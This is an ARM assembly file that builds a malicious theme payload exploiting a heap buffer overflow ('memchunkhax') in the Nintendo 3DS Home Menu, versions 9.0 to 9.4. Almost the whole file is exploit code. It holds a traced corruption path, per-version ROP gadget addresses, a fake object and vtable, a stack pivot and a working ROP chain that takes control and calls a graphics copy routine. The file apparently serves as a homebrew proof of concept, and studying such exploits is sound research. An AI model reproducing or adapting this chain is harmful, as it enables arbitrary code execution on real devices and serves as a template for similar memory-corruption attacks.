.arm
.section .init
.global _start

@ This is the start of the decompressed theme data.

/*
All function addresses referenced here are for v9.4 homemenu.

The memchunkhax(triggered by the buf overflow + memfree) triggers overwriting the saved r4 on the L_22fb34 stackframe, with value=<address of the below object label>. This is the function which called the memfree function.
After calling some func which decreases some counter, homemenu then executes L_1ca5d0(r4), where r4 is the above overwritten ptr.
L_1ca5d0: This first writes u8 value 1 to 0x3b7e. After checking/using other state, this function eventually executes: L_1d1ea8(*(inr0+0x3a60), 1);//where inr0=above ptr
L_1d1ea8: After using other state, it executes: return L_2441a0(*(inr0+0x2f0), inr1);
L_2441a0: L_1e95e0(*(inr0+4)); ...
L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from objectptr> ...//This is where this haxx finally gets control over an objectptr(r0) + PC at the same time.
*/

#define STACKPIVOT_ADR 0x00100fdc //7814bd30 ldmdavc r4, {r4, r5, r8, sl, fp, ip, sp, pc} (same addr for v9.1j - v9.4 all regions)

#if SYSVER>=93 //v9.3-v9.4
#define ROP_LOADR4_FROMOBJR0 0x10b574 //load r4 from r0+16, return if r4==r5. obj/r0 = r4-32. call vtable funcptr +12 from this obj.
#define ROP_POPPC 0x10203c
#define POP_R4LR_BXR1 0x0011df68 //"pop {r4, lr}" "bx r1"
#else
#define ROP_LOADR4_FROMOBJR0 0x10b64c
#define ROP_POPPC 0x102028
#define POP_R4LR_BXR1 0x0011dda4
#endif

#if SYSVER == 93
#define SRV_GETSERVICEHANDLE 0x0022472c
#define POP_R1PC 0x002262bc
#elif SYSVER == 94
#define SRV_GETSERVICEHANDLE 0x0022470c
#define POP_R1PC 0x0022629c
#endif

#if SYSVER>=93 //v9.3-v9.4
#define POP_R0PC 0x00154f0c
#define POP_R3PC 0x00102a40
#define POP_R2R6PC 0x001512c4 //pop {r2, r3, r4, r5, r6, pc}

#define ROP_STR_R1TOR0 0x00103f58
#define ROP_LDR_R0FROMR0 0x0010f01c
#define ROP_LDRR1R1_STRR1R0 0x002003bc
#define ROP_MOVR1R3_BXIP 0x001c2e24
#define ROP_ADDR0_TO_R1 0x0012b64c

#define MEMCPY 0x00150940

#define SVCSLEEPTHREAD 0x0012b590

#define GXLOW_CMD4 0x0014ac9c
#endif

#if SYSVER <= 92 //v9.0-v9.2
#define ROP_STR_R1TOR0 0x00103f40
#define ROP_LDR_R0FROMR0 0x0010efe8
#define ROP_ADDR0_TO_R1 0x0012e708
#endif

#if SYSVER == 92
#define POP_R0PC 0x001575ac
#define POP_R1PC 0x00214988
#define POP_R3PC 0x00102a24
#define POP_R2R6PC 0x00150160

#define ROP_LDRR1R1_STRR1R0 0x001f1e7c
#define ROP_MOVR1R3_BXIP 0x001b8708

#define MEMCPY 0x001536f8

#define SVCSLEEPTHREAD 0x0012e64c

#define SRV_GETSERVICEHANDLE 0x00212de0

#define GXLOW_CMD4 0x0014d65c
#endif

#if SYSVER <= 91 //v9.0-v9.1j
#define POP_R0PC 0x00157554
#define POP_R1PC 0x002149f0
#define POP_R3PC 0x00102a24
#define POP_R2R6PC 0x00150108

#define ROP_LDRR1R1_STRR1R0 0x001f1ee4
#define ROP_MOVR1R3_BXIP 0x001b8848
#define MEMCPY 0x001536a0

#define SVCSLEEPTHREAD 0x0012e64c

#define SRV_GETSERVICEHANDLE 0x00212e48

#define GXLOW_CMD4 0x0014d604
#endif

#define ROP_BXR1 POP_R4LR_BXR1+4

_start:

themeheader:
.word 1 @ version

.space ((themeheader + 0xc4) - .)

object:
.word HEAPBUF + (vtable - _start) @ object+0, vtable ptr
.word HEAPBUF + (object - _start) @ Ptr loaded by L_2441a0, passed to L_1e95e0 inr0.
.word 0 @ Memchunk-hdr stuff writes here.
.word 0

.word HEAPBUF + ((object + 0x20) - _start) @ This .word is at object+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.

.space ((object + 0x1c) - .) @ sp/pc data loaded by STACKPIVOT_ADR.
.word HEAPBUF + (ropstackstart - _start) @ sp
.word ROP_POPPC @ pc

.space ((object + 0x28) - .)
.word HEAPBUF + (object - _start) @ Actual object-ptr loaded by L_1e95e0, used for the vtable functr +8 call.

.space ((object + 0x2ec) - .)
#if SYSVER > 92 //Dunno if this applies for versions other than v9.2.
.word 0 @ The target ptr offset is 0x4-bytes different from v9.2.
#endif
.word HEAPBUF + (object - _start) @ Ptr loaded by L_1d1ea8, passed to L_2441a0 inr0.

.space ((object + 0x3a60) - .)
#if SYSVER <= 92 //Dunno if this applies for versions other than v9.2.
.word 0 @ The target ptr offset is 0x4-bytes different from v9.4.
#endif
.word HEAPBUF + (object - _start) @ Ptr loaded by L_1ca5d0, passed to L_1d1ea8() inr0.

vtable:
.word 0, 0 @ vtable+0
.word ROP_LOADR4_FROMOBJR0 @ vtable funcptr +8
.word STACKPIVOT_ADR @ vtable funcptr +12, called via ROP_LOADR4_FROMOBJR0.

.space ((vtable + 0x100) - .)

.space ((_start + 0x4000) - .) @ Base the stack at heapbuf+0x4000 to make sure homemenu doesn't overwrite the ROP data with the u8 write(see notes on v9.4 func L_1ca5d0).

ropstackstart:
.word POP_R1PC
.word ROP_POPPC @ r1

.word POP_R4LR_BXR1
.word 0 @ r4
.word POP_R2R6PC @ lr

.word POP_R0PC
.word 0x1f000000 @ r0, src (VRAM+0)

.word POP_R1PC
.word 0x1f1e6000 @ r1, dst (top-screen framebuffers in VRAM)

.word POP_R2R6PC
.word 0x46800*2 @ r2, size
.word 0 @ r3, width0
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6

.word GXLOW_CMD4

.word 0 @ r2 / sp0 (height0)
.word 0 @ r3 / sp4 (width1)
.word 0 @ r4 / sp8 (height1)
.word 0x8 @ r5 / sp12 (flags)
.word 0 @ r6

.word POP_R1PC
.word ROP_BXR1 @ r1

.word ROP_BXR1 @ This is used as an infinite loop.

.word 0x58584148

